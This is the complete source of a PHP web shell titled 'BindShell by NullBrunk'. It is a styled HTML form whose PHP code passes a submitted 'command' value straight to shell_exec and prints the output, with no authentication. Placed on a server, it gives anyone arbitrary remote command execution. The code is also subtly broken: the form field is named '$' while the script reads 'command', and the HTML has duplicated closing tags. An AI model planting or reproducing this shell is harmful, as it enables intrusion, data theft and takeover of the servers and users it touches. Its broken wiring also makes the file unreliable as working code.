<!DOCTYPE html>
<html>
	<head>

	<title>BindShell by NullBrunk</title>
	<meta charset="UTF-8" />
	<meta name="description" content="" />

	</head>

	<!-- CSS STYLES -->
	
	<style>
			body{
				background-color: black;
			}

			a{
				text-decoration: none;
				color: green;
				font-size: 200%
			}

			p{
				text-decoration: none;
				color: red;
				font-size: 150%
			}

			fieldset{
  				
				border:2px solid green;
    				-moz-border-radius:8px;
    				-webkit-border-radius:8px;	
    				border-radius:8px;	
			}

			hr{

				height: 1px;
				background-color: #008000 ;
				border: none;
			}

			.heading{
				text-align: center;
				font-size: 350%;
				font-family: bold;
				color: green;
			}

		</style>
	
	<!-- End of the CSS  -->
	
	
		</head>

	<div class="heading">
		<font>PHP WebShell</font><br>
	</div>

	<body>

	<fieldset>	
		<form action="" method="post">
		<p>Command : <input type="text" name="$" /> <input type="submit" value="execute"></p>

		</form>
		<hr>

		<?php


			if (isset($_POST['command'])) 
			{
				$command =  $_POST['command'];
				echo "<a><pre>".shell_exec($command)."</pre></a>";
			}
			else{
				echo "Probleme occured";
			}
		?>

	</fieldset>

	<body>

</html>
